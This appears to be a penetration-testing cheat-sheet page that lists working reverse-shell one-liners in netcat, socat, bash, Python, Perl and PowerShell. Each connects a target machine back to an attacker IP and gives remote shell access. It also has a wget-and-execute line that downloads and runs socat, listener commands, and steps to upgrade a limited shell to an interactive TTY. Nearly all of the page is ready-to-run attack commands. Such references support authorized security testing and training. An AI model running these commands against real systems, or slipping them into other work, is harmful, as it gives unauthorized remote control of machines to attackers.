---
layout: default
title: Shells
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## References

[Reverse shell cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[Reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[Upgrading shells](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

# Reverse Shells
## Netcat
```csharp
// On local machine.
nc -c /bin/bash -lvnp 4444                
rlwrap nc -lvnp 4444 // Listener for Windows.

// On remote machine.
nc 10.x.x.x 4444
sh -c nc 10.x.x.x 4444 -e /bin/bash
cmd.exe /c \\10.x.x.x\Shared\nc.exe -e cmd.exe 10.x.x.x 4444 // Run via Samba share.
```

## Socat
```csharp
// Listener on local machine.
socat file:`tty`,raw,echo=0 tcp-listen:4444

// On remote machine.
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.x.x.x:4444
```

```csharp
// Credit to ropnop's blog. Download, chmod and execute one-liner.
wget -q https://path/to/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.x.x.x:4444
```

## Bash
```csharp
// On remote machine.
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

// On remote machine.
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 6666 > /tmp/f
```

## Python
```csharp
// On remote machine.
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.x.x.x",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Perl
```csharp
// On remote machine.
perl -e 'use Socket;$i="10.x.x.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PowerShell
```csharp
// On remote machine.
cmd.exe /c powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.x.x.x',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bind Shells

## Upgrading dumb shells to interactive
After a callback to your machine to shell is likely to be restricted and not interactive.

```csharp
// Spawn an interactive shell.
python3 -c "import pty; pty.spawn('/bin/bash')"
Ctrl+Z
stty raw -echo
fg
reset

// Find the row/column values of the current window.
stty -a

// Resize the shell to match the current window to prevent nasty wrapping.
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```